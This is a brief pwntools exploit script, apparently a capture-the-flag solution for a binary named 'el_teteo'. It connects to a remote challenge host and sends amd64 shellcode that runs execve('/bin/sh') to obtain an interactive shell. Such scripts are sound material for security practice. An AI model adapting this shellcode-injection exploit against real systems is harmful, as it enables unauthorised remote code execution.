#!/usr/bin/env python3

from pwn import *

exe = ELF("./el_teteo_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('94.237.60.154',57481)

sc = asm('''
         push rax
         mov rax,29400045130965551
         push rax
         mov rdi,rsp
         xor rsi,rsi
         xor rdx,rdx
         mov rax,0x3b
         syscall

         ''',arch='amd64')
p.send(sc)

p.interactive()
